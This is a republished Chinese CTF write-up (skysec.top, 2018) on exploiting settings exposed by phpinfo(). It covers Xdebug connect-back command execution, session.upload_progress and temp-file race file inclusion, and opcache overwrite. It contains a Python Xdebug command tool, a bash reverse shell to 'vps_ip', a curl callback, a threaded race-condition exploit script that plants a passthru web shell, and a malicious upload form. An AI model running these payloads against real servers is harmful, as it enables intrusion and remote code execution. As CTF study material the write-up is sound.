## amazing phpinfo()

来源：[http://skysec.top/2018/04/04/amazing-phpinfo/](http://skysec.top/2018/04/04/amazing-phpinfo/)

时间 2018-04-04 09:42:48

 
近期打了一些国际赛，发现有不少web都给了phpinfo，并且学习到了phpinfo里存在的各种问题，如果擅于发现，很可能便于解题，甚至做出非预期的结果。在此写一篇文章记录一下。
 
## Xdebug 
 
### 前记 
 
这个是从Ricterz巨师傅那里学到的，参考链接：`https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface`### 定义 
 
Xdebug是一个PHP的调试工具，支持在本地通过源码远程调试服务器上的PHP代码。
 
Xdebug调试PHP的主要流程为：
 
1.接收到debug的信号，一般为请求参数带有XDEBUG_SESSION_START
 
2.返回一个XDEBUG_SESSION的Cookie
 
3.服务器作为客户端，根据配置文件中的xdebug.remote_host和xdebug.remote_port连接服务端（开发者的机器）
 
4.服务端收到请求，向客户端发送指令
 
### 开启Xdebug 
 
 
   于 `http://xdebug.org/download.php`
 
下载与你当前php版本匹配的Xdebug模块文件
 
修改php配置文件，在最后添加
 
 
 
```
zend_extension = "E:/wamp/bin/php/php版本号/zend_ext/刚下载的.dll";
[xdebug]
xdebug.auto_trace=On
xdebug.collect_params=On
xdebug.collect_vars = On ;收集变量
xdebug.collect_return = On ;收集返回值
xdebug.trace_output_dir="e:/wamp/tmp/debuginfo"
xdebug.remote_enable = on
xdebug.remote_handler = dbgp   
xdebug.remote_host= localhost    ;用于远程调试  服务器的地址
xdebug.remote_connect_back = 1；用于远程调试
xdebug.remote_port = 9000
xdebug.idekey = PHPSTORM
xdebug.profiler_enable = on
xdebug.profiler_enable_trigger = off
xdebug.profiler_output_name = cachegrind.out.%t.%p
xdebug.profiler_output_dir = "E:/wamp/tmp/debuginfo"
xdebug.show_local_vars=0
xdebug.show_exception_trace = On ;开启异常跟踪
xdebugbug.max_nesting_level = 10000
```
 
phpinfo中验证xdebug扩展是否启用。 服务端配置完成！
 
注：这里还可以使用wamp64，傻瓜式开启Xdebug，在php settings选项里就有
 
### 适用目标 
 
同样对目标网站的phpinfo进行浏览，一旦发现
 
```
xdebug.remote_connect_back => On => On
xdebug.remote_cookie_expire_time => 3600 => 3600
xdebug.remote_enable => On => On
```
 
即可使用Xdebug进行连接，尝试直接命令执行
 
### 实验效果 
 
我们部署完环境后
 
例如目标网址为
 
```
http://192.168.130.157:5555/index.php
```
 
假设我们知道他开启了Xdebug远程回连模式
 
我们在自己的vps上尝试
 
首先打开9000端口进行监听
 
```
root@ubuntu-512mb-sfo2-01:~# nc -l -vv -p 9000
Listening on [0.0.0.0] (family 0, port 9000)
```
 
然后执行以下命令
 
```
curl 'http://题目ip:port/index.php?XDEBUG_SESSION_START=phpstrom' -H "X-Forwarded-For: vps_ip"


```
 
然后监听端口得到回应
 
```
Connection from [题目ip] port 9000 [tcp/*] accepted (family 2, sport 36053)
445<?xml version="1.0" encoding="iso-8859-1"?>
<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///app/index.php" language="PHP" protocol_version="1.0" appid="119" idekey="phpstrom"><engine version="2.2.3"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2013 by Derick Rethans]]></copyright></init>
```
 
为了方便利用进行命令执行，Ricterz巨师傅已经写好了利用工具
 
```
#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0',9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = raw_input('>> ')
    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
```
 
将该文件放在vps上，保存为xdebug.py
 
运行
 
```
python xdebug.py
```
 
然后利用curl触发
 
```
curl 'http://题目ip:port/index.php?XDEBUG_SESSION_START=phpstrom' -H "X-Forwarded-For: vps_ip"


```
 
然后即可执行命令
 
```
>>  system("curl vps_ip:8888")
```
 
收到
 
```
root@ubuntu-512mb-sfo2-01:~# nc -l -vv -p 8888
Listening on [0.0.0.0] (family 0, port 8888)
Connection from [题目ip] port 8888 [tcp/*] accepted (family 2, sport 63917)
GET / HTTP/1.1
User-Agent: curl/7.35.0
Host: vps_ip:8888
Accept: */*
```
 
发现可以执行命令，反弹shell即可
 
```
bash -i >& /dev/tcp/vps_ip/8888 0>&1
```
 
这后面就是老生常谈的问题了，就不再细说了
 
### 注意事项 
 
存在蛇皮点，即有的时候看见phpinfo的
 
```
xdebug.remote_connect_back
xdebug.remote_enable
```
 
关闭
 
未必就不能就行xdebug回连
 
比如上次的国际赛2018-N1CTF
 
phpinfo中显示的信息是php-cli
 
但是实际上跑着的是php-fpm，而他是开着的
 
所以最后一键命令测试一下，即
 
监听自己的9000端口，再执行
 
```
curl 'http://题目ip:port/index.php?XDEBUG_SESSION_START=phpstrom' -H "X-Forwarded-For: vps_ip"


```
 
看有没有回连即可
 
## session.upload_progress 
 
### 定义 
 
session.upload_progress 是PHP5.4的新特征
 
当`session.upload_progress.enabled`选项开启时，PHP能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。
 
当一个上传在处理中，同时POST一个与INI中设置的`session.upload_progress.name`同名变量时，上传进度可以在`$_SESSION`中获得。 当PHP检测到这种POST请求时，它会在`$_SESSION`中添加一组数据, 索引是`session.upload_progress.prefix`与`session.upload_progress.name`连接在一起的值
 
### 开启session.upload_progress 
 
修改php.ini文件，开启session.upload_progress即可
 
```
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
session.upload_progress.freq = "1%"
session.upload_progress.min_freq = "1"
```
 
### 适用目标 
 
当目标网站开启phpinfo，我们可以进行浏览
 
一旦发现
 
```
session.save_path => /var/lib/php5 => /var/lib/php5
session.serialize_handler => php => php
session.upload_progress.cleanup => On => On
session.upload_progress.enabled => On => On
session.upload_progress.freq => 1% => 1%
session.upload_progress.min_freq => 1 => 1
session.upload_progress.name => PHP_SESSION_UPLOAD_PROGRESS => PHP_SESSION_UPLOAD_PROGRESS
session.upload_progress.prefix => upload_progress_ => upload_progress_
```
 
并且目标网站存在文件包含问题，则可触发该漏洞获取shell
 
### 实验效果 
 
这里直接引用官方样例
 
```php
<?php
$key = ini_get("session.upload_progress.prefix") . $_POST[ini_get("session.upload_progress.name")];
var_dump($_SESSION[$key]);
?>
```
 
上传表单
 
```html
<form action="upload.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />
 <input type="file" name="file1" />
 <input type="file" name="file2" />
 <input type="submit" />
</form>
```
 
然后上传文件后可以看到
 
```php
<?php
$_SESSION["upload_progress_123"] = array(
 "start_time" => 1234567890,   // The request time
 "content_length" => 57343257, // POST content length
 "bytes_processed" => 453489,  // Amount of bytes received and processed
 "done" => false,              // true when the POST handler has finished, successfully or not
 "files" => array(
  0 => array(
   "field_name" => "file1",       // Name of the <input/> field
   // The following 3 elements equals those in $_FILES
   "name" => "foo.avi",
   "tmp_name" => "/tmp/phpxxxxxx",
   "error" => 0,
   "done" => true,                // True when the POST handler has finished handling this file
   "start_time" => 1234567890,    // When this file has started to be processed
   "bytes_processed" => 57343250, // Number of bytes received and processed for this file
  ),
  // An other file, not finished uploading, in the same request
  1 => array(
   "field_name" => "file2",
   "name" => "bar.avi",
   "tmp_name" => NULL,
   "error" => 0,
   "done" => false,
   "start_time" => 1234567899,
   "bytes_processed" => 54554,
  ),
 )
);
```
 
但这样一来就会造成严重的问题
 
如果有文件包含的情况下，我们只需要更改
 
```
<input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />
```
 
  
中的value，将其改为php语言，即可导致session中出现我们构造的恶意代码
 
然后利用文件包含，即可触发代码，导致getshell
 
这里实战就以我在N1CTF做到的那道easyphp为例
 
当时发现phpinfo还在，于是去看了看，没想到就惊喜的发现了攻击点
 
  
![][0]
 
可以看到upload_progress.enabled开启，并且给出了session.save_path，我们去包含一下试试
 
 
 
```
http://47.97.221.96/index.php?action=../../../../var/lib/php5/sess_bi1gotgju078l3tvdnlrpnofk2
```
 
  
发现成功包含
 
  
![][1]
 
此时想到一个session_upload的解法，曾经在jarvis-oj也出现过：
 
 
 
```
http://web.jarvisoj.com:32784/
```
 
有兴趣可以尝试
 
再给出一个关于PHP_SESSION_UPLOAD_PROGRESS的官方手册
 
说明：
 
```
http://php.net/manual/zh/session.upload-progress.php
```
 
我们直接用官方给出的表单加以修改就可使用
 
官方表单：
 
```
<form action="upload.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />
 <input type="file" name="file1" />
 <input type="file" name="file2" />
 <input type="submit" />
</form>
```
 
我的表单：
 
```
<form action="http://47.97.221.96:23333" method="post" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" vaule="<?= phpinfo(); ?>" />
    <input type="file" name="file1" />
    <input type="file" name="file2" />
    <input type="submit" />
</form>
```
 
  
但是需要注意的是，cleanup是on，所以这里我用了条件竞争，一遍疯狂发包，一遍疯狂请求
 
最后得到：
 
  
![][2]
 
  
![][3]
 
最后可以在/app/下找到写入的shell，随即用菜刀连接即可
 
 
 
### 注意事项 
 
```
session.upload_progress.cleanup => On => On
```
 
该选项作用官方手册的说明为
 
```
Note that if you run that code and you print out the content of $_SESSSION[$key] you get an empty array due that session.upload_progress.cleanup is on by default and it  cleans the progress information as soon as all POST data has been read.
```
 
意思也很简单，如果你在你的session中没有获取到
 `session.upload_progress`的数据，是因为cleanup开启，他将在上传完成的瞬间清除数据
 
所以针对方法也很简单，因为是上传完毕后才会清除，那么若目标网站开启，我们只需要进行条件竞争，进行包含获取shell即可
 
## phpinfo-LFI 
 
### 前言 
 
LFI with PHPInfo是国外研究员在2001年公布的本地文件包含利用方法，但是在国内兴起较晚，在CTF中非常少见
 
我也是前一段时间才知道有这个小技巧(= =还是太菜了！)
 
### 定义 
 
顾名思义，LFI即文件包含，而这和phpinfo有什么关系？
 
关系就在于以上传文件的方式请求任意PHP文件，服务器都会创建临时文件来保存文件内容
 
而这个临时文件的位置正好会在phpinfo中显示出来
 
### 开启phpinfo() 
 
这个当然很简单了
 
直接写一个文件
 
```php
<?php
phpinfo();
```
 
即可
 
### 适用目标 
 
1.目标存在文件包含点
 
2.目标留有phpinfo()页面
 
### 实战测试 
 
可能有人会说，查看phpinfo()页面
 
怎么没有看到
 
这是因为这一栏必须在上传文件的时候才会出现
 
我们随便构造一个上传表单
 
```
<!doctype html>  
<html>  
<body>  
    <form action="http://localhost/testphpinfo/phpinfo.php" method="POST" enctype="multipart/form-data">  
    <input type="file" name="file"/>
  
    <input type="submit" name="submit" value="Submit" />  
</form>  
</body>  
</html>
```
 
上传文件完毕后
 
查看phpinfo()
 
发现该项
 
```
_FILES["file"]	
Array
(
    [name] => test.txt
    [type] => application/octet-stream
    [tmp_name] => H:\wamp64\tmp\php1E81.tmp
    [error] => 0
    [size] => 201
)
```
 
phpinfo直接给出了临时文件的文件名与绝对路径
 
这也是为什么会导致文件包含getshell
 
当然临时文件在上传结束后就会很快消失
 
所以我们必须快速访问，即条件竞争包含该文件
 
再触发其中代码，写一个shell
 
例如：
 
```php
<?php $c=fopen('/app/intrd','w');fwrite($c,'<?php passthru($_GET["f"]);?>');?>
```
 
我们利用python不断伪造上传包，再根据phpinfo()返回的路径名去包含文件
 
一旦条件竞争成功，包含该文件即会触发写文件
 
在/app/目录下的intrd文件里写进我们的shell
 
然后即可达成getshell的目的
 
这里附上国外大哥的exp脚本
 
```python
## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit
# Alternative way to easy_php @ N1CTF2018, solved by intrd & shrimpgo - p4f team
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/

## passwords.txt payload content
# <?php $c=fopen('/app/intrd','w');fwrite($c,'<?php passthru($_GET["f"]);?>');?>


import sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re
from subprocess import Popen, PIPE, STDOUT

NumOfThreads=50
queue = Queue.Queue()

class checkHash(threading.Thread):
	def __init__(self,queue):
		threading.Thread.__init__(self)
		self.queue=queue
	def run(self):
		i=0
		while True:
			self.clear=self.queue.get()
			passtry = self.clear
			if passtry != "":

				padding="A" * 5000

				cookies = {
				    'PHPSESSID': 'o99quh47clk8br394298tkv5o0',
				    'othercookie': padding
				}

				headers = {
				    'User-Agent': padding,
				    'Pragma': padding,
				    'Accept': padding,
				    'Accept-Language': padding,
				    'DNT': '1'
				}

				files = {'arquivo': open('passwords.txt','rb')}

				reqs='http://47.97.221.96:23333/index.php?action=../../var/www/phpinfo/index.php&a='+padding
				#reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&a='+padding
				response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=False)
				data = response.content
				data = re.search(r"(?<=tmp_name] => ).*", data).group(0)
				print data

				reqs = 'http://47.97.221.96:23333/index.php?action=../..'+data
				#reqs = 'http://172.17.0.2:80/index.php?action=../..'+data
				print reqs
				response = requests.get(reqs, verify=False)
				data = response.content
				print data

			i+=1
			self.queue.task_done()

for i in range(NumOfThreads):
    t=checkHash(queue)
    t.setDaemon(True)
    t.start()

for x in range(0, 9999):
	x=str(x)
	queue.put(x.strip())

queue.join()

```
 
再附上这位大哥当时CTF的实战题解
 
```
http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/
```
 
## OPCACHE 
 
### 定义 
 
opcache是缓存文件，他的作用就类似于web项目中的静态文件的缓存, 比如我们加载一个网页, 浏览器会自动帮我们把jpg, css缓存起来, 唯独php没有缓存, 每次均需要open文件, 解析代码, 执行代码这一过程, 而opcache即可解决这个问题, 代码会被高速缓存起来, 提升访问速度。
 
### 适用目标 
 
同样也是查看phpinfo()
 
如果目标网站
 
```
opcache.enable => On => On
```
 
即可判断开启了opcache
 
### 实战效果 
 
为什么opcache可以导致我们注入恶意代码？
 
设想A网站：
 
A网站的网页index.php具有缓存文件index.php.bin
 
而访问index.php的时候加载缓存index.php.bin
 
倘若这时候具有上传，我们可以覆盖index.php.bin
 
是不是就会加载我们的恶意文件了呢？
 
而一般的上传检测，也很少有检测.bin后缀的，所以造成了风险
 
这里以刚结束的2018 0ctf中的ezdoor为例
 
代码非常的短
 
```php
<?php

error_reporting(0);

$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
  mkdir($dir);
}
if(!file_exists($dir . "index.php")){
  touch($dir . "index.php");
}

function clear($dir)
{
  if(!is_dir($dir)){
    unlink($dir);
    return;
  }
  foreach (scandir($dir) as $file) {
    if (in_array($file, [".", ".."])) {
      continue;
    }
    unlink($dir . $file);
  }
  rmdir($dir);
}

switch ($_GET["action"] ?? "") {
  case 'pwd':
    echo $dir;
    break;
  case 'phpinfo':
    echo file_get_contents("phpinfo.txt");
    break;
  case 'reset':
    clear($dir);
    break;
  case 'time':
    echo time();
    break;
  case 'upload':
    if (!isset($_GET["name"]) || !isset($_FILES['file'])) {
      break;
    }

    if ($_FILES['file']['size'] > 100000) {
      clear($dir);
      break;
    }

    $name = $dir . $_GET["name"];
    if (preg_match("/[^a-zA-Z0-9.\/]/", $name) ||
      stristr(pathinfo($name)["extension"], "h")) {
      break;
    }
    move_uploaded_file($_FILES['file']['tmp_name'], $name);
    $size = 0;
    foreach (scandir($dir) as $file) {
      if (in_array($file, [".", ".."])) {
        continue;
      }
      $size += filesize($dir . $file);
    }
    if ($size > 100000) {
      clear($dir);
    }
    break;
  case 'shell':
    ini_set("open_basedir", "/var/www/html/$dir:/var/www/html/flag");
    include $dir . "index.php";
    break;
  default:
    highlight_file(__FILE__);
    break;
}
```
 
就是一个上传，加上包含我们上次的文件
 
但这里有几个蛇皮的点:
 
1.上传的文件无论怎么访问都是403 Forbidden
 
2.文件夹内有index.php，想要构造恶意shell，必须将其覆盖
 
3.有后缀判断，后缀带有h即无法成功（phtml,php,phps等全军覆没）
 
而正是这种情况下，opcache的开启给我们带了机会
 
利用方式也不算复杂
 
我们在本地启动一个同版本、同配置、同目录的php项目
 
然后写一个index.php，里面是我们的恶意代码
 
然后访问这个文件，生成opcache缓存文件
 
然后利用hex工具，更改缓存文件的system_id和timestamp两个字段为题目中的值
 
而system_id和timestamp两个字段的值如何获取？
 
关于system_id，可以使用工具
 
```
https://github.com/GoSecure/php7-opcache-override
```
 
而关于timestamp
 
可以利用题目中给出的time功能获取
 
```
import requests
print requests.get('http://202.120.7.217:9527/index.php?action=time').content
print requests.get('http://202.120.7.217:9527/index.php?action=reset').content
print requests.get('http://202.120.7.217:9527/index.php?action=time').content
```
 
运行后可发现1和3的结果一致
 
更改完两个字段的值后，将我们的恶意opcache文件上传即可
 
由于题目未对bin进行过滤，并且使用了move_uploaded_file()函数
 
而该函数根据官方手册的描述，可以知道
 
```
注意：如果目标文件已经存在，将会被覆盖。
```
 
所以此时我们上传的index.php.bin成功覆盖原来的index.php.bin
 
导致访问index.php的时候，服务器加载了我们上传的恶意opcache文件，成功getshell
 
当然这里还有一种非预期解法，我就在这里随口提一下
 
肯定有同学会想能否Bypass这个过滤
 
当然是可以bypass的，这里用到以前提过的一个trick
 
即构造文件名
 
```
index.php/.
```
 
但是直接上传显然是不行的
 
官方文档对move_uploaded_file()有描述
 
```
如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。
如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。
```
 
 
   如果我们直接上传 `index.php/.
`
 
经过本地测试，显然得到的是false
 
但这里我们可以构造一个不存在的目录作为跳板
 
 
 
```
http://localhost/CTF/0CTF/ezdoor/index.php?action=upload&name=aaa/../index.php/.

```
 
同样也可以覆盖index.php
 
当然这不是我们这篇文章的重点，所以我就不展开分析了:>
 
## 一些其他的信息 
 
具体可以参考这篇文章
 
```
http://seaii-blog.com/index.php/2017/10/25/73.html
```
 
里面已经归纳了一些比较常见的phpinfo注意点，我也不细说了
 
像allow_url_include远程文件包含，disable_functions探测未过滤函数，magic_quotes_gpc的相关问题，open_basedir绕过限制，imagick的RCE漏洞（JarvisOj有相关题目），memcache
 
Redis，fastcgi等等未授权访问问题，还有常见的GOPHER打内网。相信大家都已经耳熟能详了。毕竟这些遇到的都不少，相信大家相关文章也阅读了很多~
 


[0]: https://img2.tuicool.com/nIFNNr6.jpg 
[1]: https://img0.tuicool.com/2iaY7rb.jpg 
[2]: https://img2.tuicool.com/Yfiqqmz.jpg 
[3]: https://img1.tuicool.com/fqee6ji.jpg 